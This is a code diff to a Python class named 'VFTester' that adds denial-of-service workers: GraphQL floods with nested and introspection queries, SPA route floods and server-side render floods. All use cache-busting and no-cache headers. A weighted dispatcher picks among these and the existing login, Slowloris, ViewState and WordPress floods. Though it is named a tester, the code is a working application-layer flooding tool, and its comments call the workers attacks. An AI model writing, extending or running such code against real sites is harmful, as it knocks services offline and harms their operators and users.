@@ -719,6 +719,124 @@ class VFTester:
                 consecutive_fails = 0
                 await asyncio.sleep(self.request_delay_ms / 1000)
 
+    # ─── SPA-Specific Attack Workers ──────────────────────────────────────────
+
+    async def _worker_graphql(self, session, endpoint, delay=0):
+        """GraphQL-specific flooding worker — sends complex nested queries"""
+        if delay > 0: await asyncio.sleep(delay)
+        if not endpoint: return
+        consecutive_fails = 0
+
+        # GraphQL query templates — from simple to deeply nested
+        graphql_queries = [
+            '{"query":"{ __schema { types { name fields { name type { name } } } } }"}',
+            '{"query":"{ users { id name email posts { id title comments { id body author { id name } } } } }"}',
+            '{"query":"{ products { id name price reviews { id rating body author { id name } } category { id name products { id } } } }"}',
+            f'{{"query":"{{ search(query:\\"{rand_user()}\\") {{ id title description content {{ ... on User {{ email posts {{ id }} }} ... on Post {{ body author {{ name }} }} }} }} }}"}}',
+            f'{{"query":"mutation {{ createPost(input: {{ title:\\"{rand_user()}\\", body:\\"{rand_pass()}\\", authorId:{random.randint(1,999)} }}) {{ id title }} }}"}}',
+        ]
+
+        while not self._stop.is_set():
+            t = time.time()
+            try:
+                query = random.choice(graphql_queries)
+                headers = {**self._base_headers(),
+                          "Content-Type": "application/json",
+                          "Accept": "application/json"}
+                busted = f"{endpoint}{'&' if '?' in endpoint else '?'}{rand_cache_bust()}"
+                async with session.post(busted, headers=headers, data=query,
+                                       ssl=False, allow_redirects=False) as resp:
+                    elapsed = time.time() - t
+                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                      mode="api", hint=f"GQL {resp.status}", url=endpoint)
+                    await self.live_log.add("api", resp.status, elapsed, None, endpoint, result.hint)
+                    self.health_monitor.record(result)
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="api",
+                                  err=type(e).__name__, url=endpoint)
+                await self.live_log.add("api", None, result.rt, type(e).__name__, endpoint)
+                self.health_monitor.record(result)
+            self._record(result)
+            if not result.ok:
+                consecutive_fails += 1
+                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
+            else:
+                consecutive_fails = 0
+                await asyncio.sleep(self.request_delay_ms / 1000)
+
+    async def _worker_spa_route(self, session, routes, delay=0):
+        """SPA Route Flood — hits client-side routes that trigger API calls"""
+        if delay > 0: await asyncio.sleep(delay)
+        if not routes: routes = [self.url]
+        consecutive_fails = 0
+
+        while not self._stop.is_set():
+            route = random.choice(routes)
+            url = route if route.startswith('http') else f"{self.site_root}{route}"
+            t = time.time()
+            try:
+                api_url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
+                headers = {**self._base_headers(),
+                          "Accept": "application/json, text/plain, */*",
+                          "X-Requested-With": "XMLHttpRequest"}
+                async with session.get(api_url, headers=headers,
+                                       ssl=False, allow_redirects=True) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t
+                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                      mode="page", hint=f"SPA {resp.status} ({len(body):,}B)", url=url)
+                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
+                    self.health_monitor.record(result)
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
+                                  err=type(e).__name__, url=url)
+                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
+                self.health_monitor.record(result)
+            self._record(result)
+            if not result.ok:
+                consecutive_fails += 1
+                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
+            else:
+                consecutive_fails = 0
+                await asyncio.sleep(self.request_delay_ms / 1000)
+
+    async def _worker_ssr_render(self, session, routes, delay=0):
+        """SSR Render Flood — forces server-side rendering on Next.js/SSR pages"""
+        if delay > 0: await asyncio.sleep(delay)
+        if not routes: routes = [self.url]
+        consecutive_fails = 0
+
+        while not self._stop.is_set():
+            route = random.choice(routes)
+            url = route if route.startswith('http') else f"{self.site_root}{route}"
+            t = time.time()
+            try:
+                busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
+                headers = {**self._base_headers(),
+                          "Accept": "text/html,application/xhtml+xml",
+                          "Cache-Control": "no-cache, no-store, must-revalidate",
+                          "Pragma": "no-cache"}
+                async with session.get(busted, headers=headers,
+                                       ssl=False, allow_redirects=True) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t
+                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                      mode="page", hint=f"SSR {resp.status} ({len(body):,}B)", url=url)
+                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
+                    self.health_monitor.record(result)
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
+                                  err=type(e).__name__, url=url)
+                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
+                self.health_monitor.record(result)
+            self._record(result)
+            if not result.ok:
+                consecutive_fails += 1
+                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
+            else:
+                consecutive_fails = 0
+                await asyncio.sleep(self.request_delay_ms / 1000)
+
     async def _worker_viewstate(self, session, delay=0):
         """ASP.NET ViewState flooding worker — sends POST requests with fresh ViewState"""
         if delay > 0: await asyncio.sleep(delay)
@@ -837,60 +955,111 @@ class VFTester:
             all_tasks.append(t)
             return
 
-        # Weight-based selection
-        r = random.random()
-        cumulative = 0
-        login_pct = 0.40
-        page_pct = 0.20
-        resource_pct = 0.15
-        slowloris_pct = 0.05
-        api_pct = 0.05 if self.has_api else 0
-        viewstate_pct = 0.10 if self.is_aspnet else 0
-        wp_pct = 0.10 if self.is_wordpress else 0
+        # Check if SPA strategy — use SPA-optimized weights
+        spa_config = self.attack.get("spa_config", {})
+        if spa_config.get("enabled"):
+            weights = spa_config.get("worker_weights", {})
+            login_pct = weights.get("login_pct", 0.05)
+            page_pct = 0       # SPAs: page flood is useless
+            resource_pct = weights.get("resource_pct", 0.05)
+            slowloris_pct = weights.get("slowloris_pct", 0.05)
+            api_pct = weights.get("api_pct", 0.40)
+            graphql_pct = weights.get("graphql_pct", 0.20)
+            spa_route_pct = weights.get("spa_route_pct", 0.15)
+            ssr_render_pct = weights.get("ssr_render_pct", 0.10)
+            viewstate_pct = 0
+            wp_pct = 0
+        else:
+            # Default weight distribution for traditional sites
+            login_pct = 0.40
+            page_pct = 0.20
+            resource_pct = 0.15
+            slowloris_pct = 0.05
+            api_pct = 0.05 if self.has_api else 0
+            graphql_pct = 0
+            spa_route_pct = 0
+            ssr_render_pct = 0
+            viewstate_pct = 0.10 if self.is_aspnet else 0
+            wp_pct = 0.10 if self.is_wordpress else 0
 
         # Normalize
-        total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + viewstate_pct + wp_pct
+        total = (login_pct + page_pct + resource_pct + slowloris_pct +
+                 api_pct + graphql_pct + spa_route_pct + ssr_render_pct +
+                 viewstate_pct + wp_pct)
         if total == 0: total = 1
         login_pct /= total
         page_pct /= total
         resource_pct /= total
         slowloris_pct /= total
         api_pct /= total
+        graphql_pct /= total
+        spa_route_pct /= total
+        ssr_render_pct /= total
         viewstate_pct /= total
         wp_pct /= total
 
+        r = random.random()
         cumulative = 0
+
+        # API Flood (PRIMARY for SPA)
+        cumulative += api_pct
+        if r < cumulative:
+            endpoints = self.profile.get("api_endpoints", []) or self.attack.get("api_config", {}).get("endpoints", [])
+            t = asyncio.create_task(self._worker_api(session, endpoints, delay=delay))
+            all_tasks.append(t); return
+
+        # GraphQL Flood
+        cumulative += graphql_pct
+        if r < cumulative:
+            graphql_ep = spa_config.get("graphql_endpoint") or f"{self.site_root}/graphql"
+            t = asyncio.create_task(self._worker_graphql(session, graphql_ep, delay=delay))
+            all_tasks.append(t); return
+
+        # SPA Route Flood
+        cumulative += spa_route_pct
+        if r < cumulative:
+            routes = spa_config.get("spa_routes", pages)
+            t = asyncio.create_task(self._worker_spa_route(session, routes, delay=delay))
+            all_tasks.append(t); return
+
+        # SSR Render Flood (Next.js)
+        cumulative += ssr_render_pct
+        if r < cumulative:
+            next_routes = spa_config.get("next_data_routes", pages)
+            t = asyncio.create_task(self._worker_ssr_render(session, next_routes, delay=delay))
+            all_tasks.append(t); return
+
+        # Login Flood
         cumulative += login_pct
         if r < cumulative:
             t = asyncio.create_task(self._worker_login(session, delay=delay))
             all_tasks.append(t); return
 
+        # Page Flood
         cumulative += page_pct
         if r < cumulative:
             t = asyncio.create_task(self._worker_page(session, pages, delay=delay))
             all_tasks.append(t); return
 
+        # Resource Flood
         cumulative += resource_pct
         if r < cumulative:
             t = asyncio.create_task(self._worker_resource(session, resources, delay=delay))
             all_tasks.append(t); return
 
+        # Slowloris
         cumulative += slowloris_pct
         if r < cumulative:
             t = asyncio.create_task(self._worker_slowloris(session, delay=delay))
             all_tasks.append(t); return
 
-        cumulative += api_pct
-        if r < cumulative:
-            endpoints = self.profile.get("api_endpoints", [])
-            t = asyncio.create_task(self._worker_api(session, endpoints, delay=delay))
-            all_tasks.append(t); return
-
+        # ViewState
         cumulative += viewstate_pct
         if r < cumulative:
             t = asyncio.create_task(self._worker_viewstate(session, delay=delay))
             all_tasks.append(t); return
 
+        # WordPress
         cumulative += wp_pct
         if r < cumulative:
             wp_config = self.attack.get("wordpress_config", {})
